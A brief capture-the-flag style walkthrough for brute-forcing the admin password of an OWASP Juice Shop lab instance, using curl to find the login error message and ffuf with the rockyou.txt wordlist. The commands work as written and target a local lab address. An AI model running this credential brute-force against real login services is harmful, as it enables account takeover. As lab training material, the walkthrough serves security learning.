1. Make sure you have the rockyou.txt wordfile. You can download it from various online sources if not.

2. Identify the http request required to login. We will use the query found in previous challenges, however if you wanted to find it again
you would have to open the dev tools on your browser, attempt to login, and look at the network tab for the POST message. From there you can extract the following:

URL: http://<IP>:<PORT>/rest/user/login
headers: Content-Type: application/json
method: POST
body: {"email":"test@mail.com","password":"pass"}

3. Attempt a basic login with bad credentials to try and find an error message pattern to filter out:

menash@attacker:~$ curl -s -X POST http://10.100.102.52:3000/rest/user/login \
                          -H "Content-Type: application/json" \
                          -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"3\"}"

Invalid email or password.
menash@attacker:~$ 

4. construct the ffuf command that will be used to bruteforce the password:

ffuf -w /usr/share/wordlists/rockyou.txt \
     -u http://10.100.102.52:3000/rest/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
     -fr "Invalid email or password"

4. Run the command and wait until a code of 200 appears. My server took roughly 20 minutes to find a match.
